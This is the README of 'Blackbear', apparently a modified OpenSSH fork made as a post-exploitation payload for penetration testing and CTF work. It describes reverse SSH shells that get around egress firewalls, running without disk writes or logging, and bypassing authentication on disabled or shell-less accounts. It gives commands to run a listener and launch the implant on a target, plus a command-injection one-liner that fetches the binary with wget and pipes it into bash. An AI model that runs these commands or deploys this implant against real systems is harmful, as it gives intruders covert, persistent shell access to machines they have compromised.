# Blackbear: a fork of openssh-portable for penetration testing purposes.

Disclamer: Do not use in production or on any public facing servers. Use only
in penetration testing context, while participating in capture the flag 
competitions or otherwise studying computer security. I've made modifications
which severly degrade the security of the server. 

## Blackbear project goals:

The blackbear server is to be used as main payload for RCE exploits.  

Main goal is to have reliable interactive shell access (must be able to run 
top, sudo, screen, vi, etc) as opposed to crafted reverse shells 
meterpreter which allow basic commands but fail at interactive ones.

Secondary goal is to implement reverse ssh shell operation.  This means 
than the server must be able to establish a tcp connection in addition to
its ability to listen for incoming connections and vice versa.  Once the
server can connect to the client, the ssh protocol happens as usual so
the client which received the connection gets a shell on the server.

As always, reverse shell operation is meant to bypass firewall with spotty
(if any) egress filtering.

Slides and videos of NSEC 2018 talk in nsec18 directory

Additionnal goals:

- be able to run under any user account, must not require root or elevated 
privileges.                                                                
- server must not touch the disk, host keys shall be generated on the fly 
(insecure), authorized keys and configuration must be encoded within the 
binary, no logging.  Only /dev/urandom and other required device files shall 
be used.
- must bypass any and all authentication mecanisms except public key
authentication.  Than is to be able to gain access even if
~/.ssh/authorized_keys does not exists, the account is disabled, the 
account has an invalid shell, etc.

## Quickstart

1. Install zlib and OpenSSL libraries and development files for your distribution

2. Run autoreconf to generate the configure scrip

3. The usual ./configure then make

4. Run the ssh client in listening mode

  e.g: listen on all interfaces, using port 8022
  ./ssh -i id_blackbearkey -r 0.0.0.0 -p 8022

5. Upload sshd binary on the target and run

  e.g: connect back to you on port 8022
  ./sshd -s LHOST -p 8022

You shall receive a shell with the priviledges of the account running sshd

## Easyexecute

patch the binary to make it a bash script that will chmod +x itself
easyexecute.py sshd
then sshd can be piped into bash, see example below

Basic example for Damn Vulnerable Web Application (command injection):

`export ARGS="-s 192.168.122.1 -p 8022"; cd /tmp; wget -r http://192.168.122.1:8080/sshd -O sshd && cat sshd | bash`

INSTALL has more detailed compilation instructions.


